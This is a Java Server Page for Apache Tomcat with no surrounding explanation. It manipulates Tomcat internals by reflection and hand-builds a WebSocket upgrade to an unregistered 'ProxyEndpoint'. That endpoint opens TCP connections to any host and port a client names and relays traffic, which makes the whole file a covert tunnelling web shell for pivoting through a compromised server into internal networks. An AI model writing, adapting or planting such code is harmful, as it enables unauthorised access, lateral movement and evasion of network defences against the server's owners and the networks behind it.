<%@ page import="java.util.*" %>
<%@ page import="javax.websocket.server.ServerContainer" %>
<%@ page import="javax.websocket.server.ServerEndpointConfig" %>
<%@ page import="org.apache.tomcat.websocket.server.WsServerContainer" %>
<%@ page import="org.apache.tomcat.util.http.MimeHeaders" %>
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page import="java.nio.channels.AsynchronousSocketChannel" %>
<%@ page import="java.nio.ByteBuffer" %>
<%@ page import="java.nio.channels.CompletionHandler" %>
<%@ page import="java.net.InetSocketAddress" %>
<%@ page import="java.util.concurrent.Future" %>
<%@ page import="java.util.concurrent.TimeUnit" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="javax.websocket.*" %>
<%@ page import="org.apache.tomcat.util.security.ConcurrentMessageDigest" %>
<%@ page import="org.apache.tomcat.util.codec.binary.Base64" %>
<%@ page import="java.nio.charset.StandardCharsets" %>
<%@ page import="org.apache.tomcat.websocket.Transformation" %>
<%@ page import="org.apache.tomcat.websocket.Constants" %>
<%@ page import="org.apache.tomcat.websocket.server.WsHandshakeRequest" %>
<%@ page import="org.apache.tomcat.websocket.WsHandshakeResponse" %>
<%@ page import="org.apache.tomcat.websocket.server.WsHttpUpgradeHandler" %>
<%@ page import="org.apache.catalina.connector.RequestFacade" %>

<%!
    public static class ProxyEndpoint extends Endpoint {
        long i =0;
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        HashMap<String, AsynchronousSocketChannel> map = new HashMap<String,AsynchronousSocketChannel>();
        static class Attach {
            public AsynchronousSocketChannel client;
            public Session channel;
        }
        void readFromServer(Session channel,AsynchronousSocketChannel client){
            final ByteBuffer buffer = ByteBuffer.allocate(50000);
            Attach attach = new Attach();
            attach.client = client;
            attach.channel = channel;
            client.read(buffer, attach, new CompletionHandler<Integer, Attach>() {
                @Override
                public void completed(Integer result, final Attach scAttachment) {
                    buffer.clear();
                    try {
                        if(buffer.hasRemaining() && result>=0)
                        {
                            byte[] arr = new byte[result];
                            ByteBuffer b = buffer.get(arr,0,result);
                            baos.write(arr,0,result);
                            ByteBuffer q = ByteBuffer.wrap(baos.toByteArray());
                            if (scAttachment.channel.isOpen()) {
                                scAttachment.channel.getBasicRemote().sendBinary(q);
                            }
                            baos = new ByteArrayOutputStream();
                            readFromServer(scAttachment.channel,scAttachment.client);
                        }else{
                            if(result > 0)
                            {
                                byte[] arr = new byte[result];
                                ByteBuffer b = buffer.get(arr,0,result);
                                baos.write(arr,0,result);
                                readFromServer(scAttachment.channel,scAttachment.client);
                            }
                        }
                    } catch (Exception ignored) {}
                }
                @Override
                public void failed(Throwable t, Attach scAttachment) {t.printStackTrace();}
            });
        }
        void process(ByteBuffer z,Session channel)
        {
            try{
                if(i>1)
                {
                    AsynchronousSocketChannel client = map.get(channel.getId());
                    client.write(z).get();
                    z.flip();
                    z.clear();
                }
                else if(i==1)
                {
                    String values = new String(z.array());
                    String[] array = values.split(" ");
                    String[] addrarray = array[1].split(":");
                    AsynchronousSocketChannel client = AsynchronousSocketChannel.open();
                    int po = Integer.parseInt(addrarray[1]);
                    InetSocketAddress hostAddress = new InetSocketAddress(addrarray[0], po);
                    Future<Void> future = client.connect(hostAddress);
                    try {
                        future.get(10, TimeUnit.SECONDS);
                    } catch(Exception ignored){
                        channel.getBasicRemote().sendText("HTTP/1.1 503 Service Unavailable\r\n\r\n");
                        return;
                    }
                    map.put(channel.getId(), client);
                    readFromServer(channel,client);
                    channel.getBasicRemote().sendText("HTTP/1.1 200 Connection Established\r\n\r\n");
                }
            }catch(Exception ignored){
            }
        }
        @Override
        public void onOpen(final Session session, EndpointConfig config) {
            i=0;
            session.setMaxBinaryMessageBufferSize(1024*1024*20);
            session.setMaxTextMessageBufferSize(1024*1024*20);
            session.addMessageHandler(new MessageHandler.Whole<ByteBuffer>() {
                @Override
                public void onMessage(ByteBuffer message) {
                    try {
                        message.clear();
                        i++;
                        process(message,session);
                    } catch (Exception ignored) {
                    }
                }
            });
        }
    }
    private void SetHeader(HttpServletRequest request, String key, String value){
        Class<? extends HttpServletRequest> requestClass = request.getClass();
        try {
            Field requestField = requestClass.getDeclaredField("request");
            requestField.setAccessible(true);
            Object requestObj = requestField.get(request);
            Field coyoteRequestField = requestObj.getClass().getDeclaredField("coyoteRequest");
            coyoteRequestField.setAccessible(true);
            Object coyoteRequestObj = coyoteRequestField.get(requestObj);
            Field headersField = coyoteRequestObj.getClass().getDeclaredField("headers");
            headersField.setAccessible(true);
            MimeHeaders headersObj = (MimeHeaders)headersField.get(coyoteRequestObj);
            headersObj.removeHeader(key);
            headersObj.addValue(key).setString(value);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    private static String getWebSocketAccept(String key) {
        byte[] WS_ACCEPT = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11".getBytes(StandardCharsets.ISO_8859_1);
        byte[] digest = ConcurrentMessageDigest.digestSHA1(key.getBytes(StandardCharsets.ISO_8859_1), WS_ACCEPT);
        return Base64.encodeBase64String(digest);
    }
%>

<%
    Map<String, String> pathParams = Collections.emptyMap();
    List<Extension> negotiatedExtensionsPhase = Collections.emptyList();
    Transformation transformation = null;
    String subProtocol = null;
    ServletContext servletContext = request.getSession().getServletContext();
    ServerEndpointConfig configEndpoint = ServerEndpointConfig.Builder.create(ProxyEndpoint.class, "/x").build();
    WsServerContainer container = (WsServerContainer) servletContext.getAttribute(ServerContainer.class.getName());
    response.setHeader(Constants.UPGRADE_HEADER_NAME, Constants.UPGRADE_HEADER_VALUE);
    response.setHeader(Constants.CONNECTION_HEADER_NAME, Constants.CONNECTION_HEADER_VALUE);
    response.setHeader(HandshakeResponse.SEC_WEBSOCKET_ACCEPT, getWebSocketAccept(request.getHeader("Sec-WebSocket-Key")));
    response.setStatus(101);
    WsHandshakeRequest wsRequest = new WsHandshakeRequest(request, pathParams);
    WsHandshakeResponse wsResponse = new WsHandshakeResponse();
    configEndpoint.getConfigurator().modifyHandshake(configEndpoint, wsRequest, wsResponse);
    try {
        WsHttpUpgradeHandler wsHandler = ((RequestFacade)request).upgrade(WsHttpUpgradeHandler.class); //RequestFacade use for Tomcat 7
        wsHandler.preInit(configEndpoint, container, wsRequest, negotiatedExtensionsPhase, subProtocol, transformation, pathParams, request.isSecure());
        // Tomcat 7 //wsHandler.preInit((Endpoint)configEndpoint, configEndpoint, container, wsRequest, negotiatedExtensionsPhase2, subProtocol, transformation, pathParams, request.isSecure());
    }catch (Exception e) {
        out.println(e.toString());
    }
%>
